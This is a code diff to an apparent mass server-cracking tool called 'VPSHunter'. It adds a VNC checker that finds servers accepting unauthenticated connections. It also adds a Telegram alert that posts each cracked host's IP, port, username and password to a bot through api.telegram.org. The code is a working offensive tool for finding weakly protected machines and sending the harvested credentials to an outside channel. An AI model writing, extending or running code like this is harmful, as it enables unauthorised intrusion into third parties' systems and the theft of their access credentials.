@@ -24,6 +24,7 @@ from functools import partial
 import hashlib
 import re
 import aiohttp
+import urllib.parse
 
 # ──────────────────────────────────────────────────────────────
 # CONFIGURATION
@@ -212,6 +213,12 @@ class CrackResult:
 
     def to_dict(self):
         return asdict(self)
+
+@dataclass
+class TelegramConfig:
+    token: str = ""
+    chat_id: str = ""
+    enabled: bool = False
 
 @dataclass
 class Stats:
@@ -1026,6 +1033,62 @@ class DatabaseCracker:
         self.executor.shutdown(wait=False)
 
 # ──────────────────────────────────────────────────────────────
+# VNC CRACKER
+# ──────────────────────────────────────────────────────────────
+
+class VNCCracker:
+    def __init__(self, timeout: float = 5.0):
+        self.timeout = timeout
+        self.semaphore = asyncio.Semaphore(50)
+
+    async def check_noauth(self, target: ScanResult, stats: Stats) -> Optional[CrackResult]:
+        async with self.semaphore:
+            stats.attempts += 1
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(target.ip, target.port),
+                    timeout=self.timeout
+                )
+                
+                # Receive RFB version
+                version = await asyncio.wait_for(reader.read(12), timeout=2.0)
+                if not version.startswith(b"RFB"):
+                    writer.close()
+                    return None
+                    
+                # Echo version back
+                writer.write(version)
+                await writer.drain()
+                
+                # Read security types count
+                sec_count_bytes = await asyncio.wait_for(reader.read(1), timeout=2.0)
+                if not sec_count_bytes:
+                    writer.close()
+                    return None
+                    
+                sec_count = sec_count_bytes[0]
+                if sec_count == 0:
+                    writer.close()
+                    return None
+                    
+                # Read security types
+                sec_types = await asyncio.wait_for(reader.read(sec_count), timeout=2.0)
+                
+                # Check if security type 1 (None) is supported
+                if 1 in sec_types:
+                    writer.close()
+                    return CrackResult(
+                        ip=target.ip, port=target.port, protocol="vnc",
+                        service="VNC", username="", password="[NO AUTH]"
+                    )
+                    
+                writer.close()
+                await writer.wait_closed()
+                return None
+            except Exception:
+                return None
+
+# ──────────────────────────────────────────────────────────────
 # MAIN ORCHESTRATOR
 # ──────────────────────────────────────────────────────────────
 
@@ -1038,6 +1101,12 @@ class VPSHunter:
         self.results: List[CrackResult] = []
         self.output_file = None
         self.deps = check_dependencies()
+        
+        self.telegram = TelegramConfig(
+            token=args.telegram_token if hasattr(args, 'telegram_token') and args.telegram_token else "",
+            chat_id=args.telegram_chat if hasattr(args, 'telegram_chat') and args.telegram_chat else "",
+            enabled=bool(args.telegram_token and args.telegram_chat)
+        )
 
         self.scanner = Scanner(
             timeout=args.timeout,
@@ -1062,6 +1131,9 @@ class VPSHunter:
             timeout=args.crack_timeout,
             max_workers=args.crack_workers
         )
+        self.vnc_cracker = VNCCracker(
+            timeout=args.crack_timeout
+        )
 
     def _parse_ports(self, ports_str: str) -> List[int]:
         if not ports_str:
@@ -1085,6 +1157,34 @@ class VPSHunter:
         if hasattr(self, 'output_json_file') and self.output_json_file:
             self.output_json_file.write(json.dumps(result.to_dict()) + "\n")
             self.output_json_file.flush()
+            
+    async def _send_telegram(self, result: CrackResult):
+        if not self.telegram.enabled:
+            return
+            
+        msg = f"🟢 <b>NEW HIT FOUND!</b>\n"
+        msg += f"🖥 <b>IP:</b> <code>{result.ip}:{result.port}</code>\n"
+        msg += f"🌐 <b>Protocol:</b> {result.protocol.upper()}\n"
+        msg += f"⚙️ <b>Service:</b> {result.service}\n"
+        
+        if result.panel_name:
+            msg += f"🗂 <b>Panel:</b> {result.panel_name}\n"
+            
+        msg += f"👤 <b>User:</b> <code>{result.username}</code>\n"
+        msg += f"🔑 <b>Pass:</b> <code>{result.password}</code>\n"
+        
+        try:
+            url = f"https://api.telegram.org/bot{self.telegram.token}/sendMessage"
+            payload = {
+                "chat_id": self.telegram.chat_id,
+                "text": msg,
+                "parse_mode": "HTML"
+            }
+            async with aiohttp.ClientSession() as session:
+                async with session.post(url, json=payload, timeout=5) as resp:
+                    pass
+        except Exception as e:
+            cprint(Colors.RED, f"  [!] Failed to send Telegram alert: {e}")
 
     def _print_cracked(self, result: CrackResult):
         panel_info = f" ({result.panel_name})" if result.panel_name else ""
@@ -1150,6 +1250,11 @@ class VPSHunter:
                 else:
                     cprint(Colors.RED, f"  [SKIP] Redis: redis-py not installed")
 
+            elif target.protocol == "vnc":
+                result = await self.vnc_cracker.check_noauth(target, self.stats)
+                if result:
+                    results.append(result)
+
         except Exception as e:
             self.stats.errors += 1
             cprint(Colors.RED, f"  [ERROR] {target.ip}:{target.port} - {str(e)[:80]}")
@@ -1202,6 +1307,8 @@ class VPSHunter:
                 self.results.append(result)
                 self._print_cracked(result)
                 self._save_result(result)
+                if self.telegram.enabled:
+                    asyncio.create_task(self._send_telegram(result))
             self.progress.update(stats=self.stats, current_target=f"{target.ip}:{target.port}")
 
         self._print_summary(output_path)
@@ -1264,6 +1371,10 @@ Examples:
     parser.add_argument("--crack-workers", type=int, default=10, help="Threads per cracker (default: 10)")
     parser.add_argument("-o", "--output", help="Output file path")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    
+    # Notifications
+    parser.add_argument("--telegram-token", help="Telegram bot token for notifications")
+    parser.add_argument("--telegram-chat", help="Telegram chat ID for notifications")
 
     args = parser.parse_args()
 
